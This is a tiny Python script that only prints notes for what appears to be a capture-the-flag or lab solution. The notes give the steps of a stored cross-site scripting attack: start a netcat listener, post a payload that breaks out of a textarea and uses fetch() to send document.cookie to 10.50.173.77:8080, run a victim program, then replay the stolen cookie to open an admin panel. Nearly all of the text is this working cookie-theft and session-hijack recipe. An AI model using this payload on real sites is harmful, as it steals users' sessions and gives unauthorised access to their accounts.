#!/usr/bin/python3

print("""here just run 'nc -nvlp 8080'
and then i that text area put payload '</textarea><script>fetch('http://10.50.173.77:8080/?c='+document.cookie)</script>'
then publish this content

Ater that run ./victim
then we get the cookie in that nc server put that cookie and reload we get admin panel""")
